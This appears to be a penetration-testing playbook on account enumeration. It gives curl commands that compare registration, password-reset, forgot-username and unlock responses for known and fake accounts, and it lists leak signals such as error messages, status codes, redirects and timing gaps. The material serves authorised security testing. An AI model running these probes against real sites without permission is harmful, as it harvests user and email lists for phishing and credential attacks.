# Registration and reset enumeration (deep) — the structural oracles

## Register — the built-to-reveal form

```bash
curl -s -X POST -d "user=$KNOWN&email=a@b.c&pass=x&pass2=x&csrf=$(tok)" "$BASE/register" > rg
curl -s -X POST -d "user=$FAKE&email=b@b.c&pass=x&pass2=x&csrf=$(tok)"  "$BASE/register" > rb
diff rg rb; grep -oiE '(taken|exist|already|registered|unavailable|in use|duplicate)[^<"]*' rg rb
```

The leaks:
- `"username already taken"` / `"email already registered"` — direct
- `409 Conflict` / `422 Unprocessable` vs `201`/`302` — status
- an inline `aria-invalid="true"` / `class="taken"` on the known arm
- a `?taken=1`/`?error=exists` redirect
- the register's AJAX call — `fetch('/check-username?u=...')` the page
  makes; that endpoint is the direct oracle — grep the rendered page
  and the bundle for it
- a timing gap — a `unique`-constraint check vs a full insert attempt

## Which field leaks — username vs email

A register may check `username` OR `email` or BOTH — probe independently:

```bash
# same email, different usernames -> which leaks?
curl -s -X POST -d "user=AAA&email=SAME@x.c&pass=x" "$BASE/register"
curl -s -X POST -d "user=BBB&email=SAME@x.c&pass=x" "$BASE/register"
# same username, different emails
curl -s -X POST -d "user=SAME&email=a@x.c&pass=x" "$BASE/register"
curl -s -X POST -d "user=SAME&email=b@x.c&pass=x" "$BASE/register"
```

An email-check enumerates EMAILS (a more valuable list); a
username-check enumerates usernames. Record which field is the oracle.

## Reset / forgot — the send-side oracle

```bash
curl -i -X POST -d "email=$KNOWN" "$BASE/forgot-password" > fg
curl -i -X POST -d "email=$FAKE"  "$BASE/forgot-password" > fb
diff fg fb; grep -oE '(sent|queued|emails|exist|to|found|if)[^,}<"]*' fg fb
```

- a `"No account with that email"` — direct
- a `{"emails_queued":1}`/`{"sent":true}` — a field
- a `302 /check-email` only on the real arm — a redirect
- a timing gap — the `lookup`+`send` runs only for a real row
- the SEND itself — does YOUR email get the link? (the side-effect)

## forgot-username / unlock / reactivate

```bash
curl -i -X POST -d "email=$KNOWN" "$BASE/forgot-username" > fgu
curl -i -X POST -d "email=$FAKE"  "$BASE/forgot-username" > fbu
# "we emailed your username" vs "no such email"
curl -i -X POST -d "user=$KNOWN" "$BASE/unlock" > ug
curl -i -X POST -d "user=$FAKE"  "$BASE/unlock" > ub
# "account unlocked" vs "no locked account"
```

## The reset-token boundary

The reset TOKEN (`web-auth-session`/`web-logic-flaw`) is a separate
measurement — the existence oracle is this class's; the token's
predictability/leakage is the neighbor's. Do not conflate them.
